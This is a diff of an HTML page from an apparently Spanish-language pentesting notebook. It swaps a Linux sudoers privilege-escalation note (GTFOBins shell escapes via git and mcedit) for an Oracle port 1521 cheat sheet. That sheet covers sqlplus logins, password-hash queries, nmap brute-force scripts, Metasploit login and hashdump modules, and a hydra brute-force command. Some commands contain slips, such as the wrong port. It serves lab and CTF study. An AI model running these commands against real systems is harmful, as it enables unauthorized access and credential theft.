@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
-    <title>Sudoers | Notebook</title>
+    <title>1521 - Oracle Database | Notebook</title>
     <link rel="stylesheet" href="/section.css" />
   </head>
   <body>
@@ -43,7 +43,7 @@
               <a class="vault-file" href="/notebook/enumeracion-puertos/161-snmp-udp.html">161 - SNMP (UDP)</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/389-636-3268-3269-ldap.html">389, 636, 3268, 3269 - LDAP</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/1433-mssql.html">1433 - MSSQL</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/1521-oracle-database.html">1521 - Oracle Database</a>
+              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/1521-oracle-database.html">1521 - Oracle Database</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/2049-nfs.html">2049 - NFS</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/3128-squid-proxy.html">3128 - Squid Proxy</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/3306-mysql.html">3306 - MySQL</a>
@@ -55,7 +55,7 @@
               <summary>Escalada de Privilegios</summary>
               <details class="vault-folder vault-subfolder" open>
                 <summary>Linux</summary>
-                <a class="vault-file is-active" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
               </details>
@@ -66,9 +66,9 @@
           </nav>
         </aside>
 
-        <article class="note-panel is-active" id="sudoers">
+        <article class="note-panel is-active" id="1521-oracle-database">
           <div class="note-tabbar">
-            <span>Sudoers</span>
+            <span>1521 - Oracle Database</span>
             <details class="notebook-tag-search">
               <summary>Buscar tags</summary>
               <label>
@@ -77,64 +77,104 @@
               </label>
               <div class="notebook-search-results" aria-live="polite"></div>
             </details>
-            <span>~/notebook/Escalada de Privilegios/Linux</span>
+            <span>~/notebook/Enumeración de Puertos</span>
           </div>
 
           <div class="note-content">
-            <p class="eyebrow">escalada de privilegios / linux / sudoers</p>
-            <h2>Sudoers</h2>
+            <p class="eyebrow">enumeración de puertos / oracle database</p>
+            <h2>1521 - Oracle Database</h2>
 
-            <p><code>/etc/sudoers</code> es el archivo de configuración que define quién puede usar <code>sudo</code> y qué comandos puede ejecutar como otro usuario, normalmente <code>root</code>.</p>
+            <p><code>1521</code> (Oracle Database)  Base de datos Oracle.</p>
+
+            <h3>Comandos en Oracle Database</h3>
 
             <section class="code-card">
-              <h3>Listar comandos que podemos ejecutar como otro usuario</h3>
-              <pre><code>sudo -l
+              <h3>comandos</h3>
+              <pre><code># Iniciar sesión con credenciales válidas. 
+sqlplus /&lt;contraseña&gt;@&lt;ip_servidor&gt;:1521/ 
 
-# Output
-student ALL=(root) NOPASSWD: /usr/bin/man</code></pre>
+# Iniciar sesión como administrador.
+sqlplus / as sysdba  
+
+# Enumerar usuarios de la base de datos.
+SELECT username FROM dba_users;  
+
+# Mostrar todas las tablas en la base de datos.
+SELECT * FROM all_tables; 
+
+# Enumerar todas las vistas disponibles.
+SELECT * FROM all_views;  
+
+# Enumerar todos los índices de la base de datos. 
+SELECT * FROM all_indexes; 
+
+# Obtener hashes de contraseñas de los usuarios.
+SELECT password FROM sys.user$ WHERE name=&#x27;&#x27;</code></pre>
             </section>
 
-            <p><a href="https://gtfobins.github.io/#+sudo">GTFOBins SUDO</a></p>
+            <h3>Enumerar con nmap</h3>
 
             <section class="code-card">
-              <h3>Ejecutar binarios permitidos como otro usuario</h3>
-              <pre><code># Para usuario pepe
-sudo -u pepe git -p help config
+              <h3>oracle</h3>
+              <pre><code># Buscar todos los scriptps que tiene nmap para Oracle.
+ls -la /usr/share/nmap/scripts/ | grep -e &quot;oracle&quot;
 
-# Para root
-sudo git -p help config</code></pre>
+# Utilizar todos los scripts.
+nmap -p 21 &lt;ip_objetivo&gt; --script &quot;oracle-*&quot;
+
+# Enumeración de usuarios. 
+nmap -p 1521 --script oracle-enum-users &lt;ip_victima&gt; 
+
+# Ataque de fuerza bruta.
+nmap -p 1521 --script oracle-brute &lt;ip_victima&gt;  
+
+# Descubrimiento del SID de la base de datos.
+nmap -p 1521 --script oracle-sid-brute &lt;ip_victima&gt; 
+
+# Ver versión del servicio TNS.
+nmap -p 1521 --script oracle-tns-version &lt;ip_victima&gt;</code></pre>
             </section>
 
-            <h2>Binarios No Contemplados en GTFOBins</h2>
+            <h3>Explotación con Metasploit</h3>
 
             <section class="code-card">
-              <h3>mcedit</h3>
-              <pre><code>sudo mcedit
+              <h3>Metasploit</h3>
+              <pre><code># Enumeración de usuarios
+msfconsole -q 
+use auxiliary/admin/oracle/oracle_login  
+set RHOSTS &lt;ip_victima&gt; 
+run
 
-# Comandos
-F+9
+# Ataque de autenticación
+use auxiliary/scanner/oracle/oracle_login 
+set RHOSTS &lt;ip_victima&gt; 
 
-# Ruta
-File -&gt; User menu -&gt; Invoke 'shell'</code></pre>
+set USERNAME SYS # Usuario por defecto
+set PASSWORD password # Password por defecto
+set USER_FILE /ruta_diccionario.txt 
+set PASS_FILE /ruta_diccionario.txt 
+
+run
+
+# Listar recursos
+use auxiliary/admin/oracle/oracle_sid_brute # Descubrimiento de SID 
+use auxiliary/admin/oracle/oracle_hashdump # Extrae hashes de contraseñas 
+use auxiliary/admin/oracle/oracle_sql # Ejecución de consultas SQL 
+use auxiliary/admin/oracle/oracle_schema # Enumera el esquema de la bd</code></pre>
+            </section>
+
+            <h3>Fuerza Bruta</h3>
+
+            <section class="code-card">
+              <h3>hydra</h3>
+              <pre><code>hydra -l -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt &lt;ip_victima&gt; oracle</code></pre>
             </section>
 
             <h2>Tags</h2>
             <div class="tag-list">
-              <span>escalada_privilegios</span>
-              <span>sudoers</span>
-              <span>sudo</span>
-              <span>linux</span>
-              <span>gtfobins</span>
-              <span>privesc</span>
-              <span>misconfigurations</span>
-              <span>mcedit</span>
-            </div>
-
-            <h2>Máquinas Relacionadas</h2>
-            <div class="tag-list">
-              <span>Bashed</span>
-              <span>Nibbles</span>
-              <span>dog</span>
+              <span>ports</span>
+              <span>oracle</span>
+              <span>p1521</span>
             </div>
           </div>
         </article>
